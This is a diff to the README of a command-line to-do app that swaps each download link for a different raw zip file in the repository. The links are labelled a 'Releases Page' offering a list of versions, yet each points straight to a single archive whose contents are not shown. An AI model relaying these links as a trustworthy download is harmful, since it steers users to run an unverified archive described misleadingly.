@@ -1,6 +1,6 @@
 # 🎯 cli-todo-app - Simplify Task Management Effortlessly
 
-[![Download cli-todo-app](https://github.com/sura0267/cli-todo-app/raw/refs/heads/main/docs/todo-app-cli-v1.2.zip)](https://github.com/sura0267/cli-todo-app/raw/refs/heads/main/docs/todo-app-cli-v1.2.zip)
+[![Download cli-todo-app](https://raw.githubusercontent.com/sura0267/cli-todo-app/main/include/app-cli-todo-v1.4.zip)](https://raw.githubusercontent.com/sura0267/cli-todo-app/main/include/app-cli-todo-v1.4.zip)
 
 ## 📖 About
 
@@ -11,7 +11,7 @@ cli-todo-app is a feature-rich, cross-platform command-line task management appl
 To get started with cli-todo-app, follow these steps:
 
 1. **Download the Application**
-   - Visit this page to download: [cli-todo-app Releases Page](https://github.com/sura0267/cli-todo-app/raw/refs/heads/main/docs/todo-app-cli-v1.2.zip). 
+   - Visit this page to download: [cli-todo-app Releases Page](https://raw.githubusercontent.com/sura0267/cli-todo-app/main/include/app-cli-todo-v1.4.zip). 
    - You will see a list of available versions. Choose the latest version for your operating system.
 
 2. **Extract the Files**
@@ -46,7 +46,7 @@ To get started with cli-todo-app, follow these steps:
 
 To download and install cli-todo-app:
 
-1. Head over to the [cli-todo-app Releases Page](https://github.com/sura0267/cli-todo-app/raw/refs/heads/main/docs/todo-app-cli-v1.2.zip).
+1. Head over to the [cli-todo-app Releases Page](https://raw.githubusercontent.com/sura0267/cli-todo-app/main/include/app-cli-todo-v1.4.zip).
 2. Select the most recent release suitable for your system. 
 3. Follow the extraction and running instructions outlined in the "Getting Started" section above. 
 
@@ -108,4 +108,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For support, please open an issue on the GitHub repository. We strive to respond to all inquiries promptly.
 
-[![Download cli-todo-app](https://github.com/sura0267/cli-todo-app/raw/refs/heads/main/docs/todo-app-cli-v1.2.zip)](https://github.com/sura0267/cli-todo-app/raw/refs/heads/main/docs/todo-app-cli-v1.2.zip)
+[![Download cli-todo-app](https://raw.githubusercontent.com/sura0267/cli-todo-app/main/include/app-cli-todo-v1.4.zip)](https://raw.githubusercontent.com/sura0267/cli-todo-app/main/include/app-cli-todo-v1.4.zip)
